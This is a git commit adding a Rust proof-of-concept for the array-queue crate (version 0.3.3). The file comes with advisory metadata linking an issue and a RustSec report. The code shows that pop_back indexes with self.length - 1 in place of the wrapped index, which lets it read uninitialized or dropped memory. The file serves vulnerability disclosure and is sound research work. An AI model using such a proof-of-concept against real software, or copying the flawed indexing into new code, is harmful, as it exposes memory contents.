ec099d22c27b4417d20c0684e50e1dce22c91117
Ammar Askar <ammar@ammaraskar.com>
2020-09-26 00:56:41 -0700

    Add poc for array-queue crate

---
+++ poc/0017-array-queue.rs
@@ -0,0 +1,74 @@
+/*!
+```crux-poc
+[target]
+crate = "array-queue"
+version = "0.3.3"
+
+[test]
+analyzers = ["manual"]
+
+[report]
+title = "array_queue pop_back allows an out-of-bounds read."
+description = """
+array_queue implements a circular queue that wraps around an array. However, it
+fails to properly index into the array in the `pop_back` function allowing the
+reading of previously dropped or uninitialized memory.
+"""
+code_snippets = []
+patched = []
+keywords = ["memory-corruption", "uninitialized-memory"]
+issue_url = "https://github.com/raviqqe/array-queue/issues/2"
+issue_date = 2020-09-26
+affected_functions = ["array_queue::ArrayQueue::pop_back"]
+rustsec_url = "https://github.com/RustSec/advisory-db/pull/396"
+```
+!*/
+#![forbid(unsafe_code)]
+
+use array_queue::ArrayQueue;
+
+fn main() {
+    {
+        // 1. Allows reading of uninitialized memory.
+        //
+        // A queue of size 3 is setup like this:
+        //     [x, x, x]    length = 0
+        //      ^           start
+        // where x is uninitialized memory.
+        //
+        // push_back(a); push_back(b); push_back(c)
+        //     [a, b, c]    length = 3
+        //      ^           start
+        //
+        // pop_front(); pop_back():
+        //     [x, b, x]    length = 1
+        //         ^        start
+        //
+        // At this point when performing a pop_back, the queue should use the
+        // `ArrayQueue::index` method to index into the array properly but
+        // instead simply uses `self.length - 1` causing it to read the first
+        // x.
+        // https://github.com/raviqqe/array-queue/blob/32fa10f8f15140fb64a4cf36a2a834f876c91056/src/array_queue.rs#L98
+        let mut a: [u64; 32] = [0x41; 32];
+        let mut x: ArrayQueue<[[u64; 32]; 3]> = ArrayQueue::new();
+        x.push_back(&&a);
+        x.push_back(&&a);
+        x.push_back(&&a);
+
+        x.pop_front().unwrap();
+        x.pop_back().unwrap();
+
+        let popped = x.pop_back().unwrap();
+        println!("Contents of array: {:?}", popped);
+        assert_eq!(popped[0], 0x41);
+    }
+
+    {
+        // 2. Initializes memory with mem::uninitialized, this is instantly
+        //    UB for types that cannot inhabit uninitialized. Should be
+        //    changed over to MaybeUninit. (Triggers a panic on latest Rust).
+
+        //let mut x: ArrayQueue<[Box<i32>; 3]> = ArrayQueue::new();
+        //x.push_back(&Box::new(1));
+    }
+}
